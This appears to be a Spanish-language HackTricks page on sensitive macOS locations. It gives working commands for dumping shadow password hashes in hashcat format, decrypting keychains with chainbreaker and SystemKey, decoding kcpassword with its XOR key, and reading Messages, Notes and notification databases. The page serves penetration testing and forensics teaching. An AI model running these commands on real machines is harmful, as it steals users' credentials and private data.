# macOS Ubicaciones Sensibles y Daemons Interesantes

{{#include ../../../banners/hacktricks-training.md}}

## Contraseñas

### Contraseñas Shadow

La contraseña shadow se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
El siguiente comando de una línea se puede usar para volcar **toda la información sobre los usuarios** (incluida la información del hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este**](https://github.com/octomagon/davegrohl.git) se pueden usar para transformar el hash a **formato** **hashcat**.

Una línea alternativa que volcará las credenciales de todas las cuentas que no son de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Otra forma de obtener el `ShadowHashData` de un usuario es usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este archivo se **utiliza únicamente** cuando el sistema está funcionando en **modo de un solo usuario** (por lo que no es muy frecuente).

### Keychain Dump

Tenga en cuenta que al usar el binario de seguridad para **volcar las contraseñas desencriptadas**, se solicitará al usuario que permita esta operación.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basado en este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que estas herramientas ya no funcionan en Big Sur.

### Descripción general de Keychaindump

Una herramienta llamada **keychaindump** ha sido desarrollada para extraer contraseñas de los llaveros de macOS, pero enfrenta limitaciones en versiones más nuevas de macOS como Big Sur, como se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios a **root**. La herramienta explota el hecho de que el llavero está desbloqueado por defecto al iniciar sesión del usuario por conveniencia, permitiendo que las aplicaciones accedan a él sin requerir repetidamente la contraseña del usuario. Sin embargo, si un usuario opta por bloquear su llavero después de cada uso, **keychaindump** se vuelve ineficaz.

**Keychaindump** opera apuntando a un proceso específico llamado **securityd**, descrito por Apple como un demonio para operaciones de autorización y criptografía, crucial para acceder al llavero. El proceso de extracción implica identificar una **Clave Maestra** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del llavero. Para localizar la **Clave Maestra**, **keychaindump** escanea el montón de memoria de **securityd** utilizando el comando `vmmap`, buscando posibles claves dentro de áreas marcadas como `MALLOC_TINY`. El siguiente comando se utiliza para inspeccionar estas ubicaciones de memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Después de identificar posibles claves maestras, **keychaindump** busca a través de los montones un patrón específico (`0x0000000000000018`) que indica un candidato para la clave maestra. Se requieren pasos adicionales, incluida la deofuscación, para utilizar esta clave, como se detalla en el código fuente de **keychaindump**. Los analistas que se centran en esta área deben tener en cuenta que los datos cruciales para descifrar el llavero se almacenan dentro de la memoria del proceso **securityd**. Un comando de ejemplo para ejecutar **keychaindump** es:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) se puede utilizar para extraer los siguientes tipos de información de un llavero de OSX de manera forense:

- Contraseña del llavero encriptada, adecuada para ser descifrada con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Contraseñas de Internet
- Contraseñas genéricas
- Claves privadas
- Claves públicas
- Certificados X509
- Notas seguras
- Contraseñas de Appleshare

Dada la contraseña de desbloqueo del llavero, una clave maestra obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto claro.

Sin uno de estos métodos para desbloquear el llavero, Chainbreaker mostrará toda la otra información disponible.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) usando SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) rompiendo el hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) con volcado de memoria**

[Sigue estos pasos](../#dumping-memory-with-osxpmem) para realizar un **volcado de memoria**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) usando la contraseña del usuario**

Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los llaveros que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **activado el inicio de sesión automático**. Por lo tanto, el usuario se iniciará sesión automáticamente sin que se le pida una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xored con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información Interesante en Bases de Datos

### Mensajes
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificaciones

Puedes encontrar los datos de Notificaciones en `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La mayor parte de la información interesante estará en **blob**. Así que necesitarás **extraer** ese contenido y **transformarlo** a **legible** **por humanos** o usar **`strings`**. Para acceder a ello, puedes hacer:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notas

Los **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferencias

En las aplicaciones de macOS, las preferencias se encuentran en **`$HOME/Library/Preferences`** y en iOS están en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

En macOS, la herramienta de línea de comandos **`defaults`** se puede usar para **modificar el archivo de preferencias**.

**`/usr/sbin/cfprefsd`** reclama los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent` y se puede llamar para realizar acciones como modificar preferencias.

## OpenDirectory permissions.plist

El archivo `/System/Library/OpenDirectory/permissions.plist` contiene permisos aplicados a los atributos de nodo y está protegido por SIP.\
Este archivo otorga permisos a usuarios específicos por UUID (y no por uid) para que puedan acceder a información sensible específica como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys`, entre otros:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificaciones del Sistema

### Notificaciones de Darwin

El daemon principal para notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse a través del puerto Mach `com.apple.system.notification_center` (verifícalos con `sudo lsmp -p <pid notifyd>`). El daemon es configurable con el archivo `/etc/notify.conf`.

Los nombres utilizados para las notificaciones son notaciones DNS inversas únicas y cuando se envía una notificación a uno de ellos, el(los) cliente(s) que han indicado que pueden manejarla la recibirán.

Es posible volcar el estado actual (y ver todos los nombres) enviando la señal SIGUSR2 al proceso notifyd y leyendo el archivo generado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

El **Distributed Notification Center** cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza algunas verificaciones para intentar verificar a los clientes.

### Apple Push Notifications (APN)

En este caso, las aplicaciones pueden registrarse para **temas**. El cliente generará un token contactando a los servidores de Apple a través de **`apsd`**.\
Luego, los proveedores también habrán generado un token y podrán conectarse a los servidores de Apple para enviar mensajes a los clientes. Estos mensajes serán recibidos localmente por **`apsd`** que retransmitirá la notificación a la aplicación que la espera.

Las preferencias se encuentran en `/Library/Preferences/com.apple.apsd.plist`.

Hay una base de datos local de mensajes ubicada en macOS en `/Library/Application\ Support/ApplePushService/aps.db` y en iOS en `/var/mobile/Library/ApplePushService`. Tiene 3 tablas: `incoming_messages`, `outgoing_messages` y `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
También es posible obtener información sobre el daemon y las conexiones utilizando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificaciones de Usuario

Estas son notificaciones que el usuario debería ver en la pantalla:

- **`CFUserNotification`**: Esta API proporciona una forma de mostrar en la pantalla un pop-up con un mensaje.
- **El Tablero de Anuncios**: Esto muestra en iOS un banner que desaparece y se almacenará en el Centro de Notificaciones.
- **`NSUserNotificationCenter`**: Este es el tablero de anuncios de iOS en MacOS. La base de datos con las notificaciones se encuentra en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{{#include ../../../banners/hacktricks-training.md}}
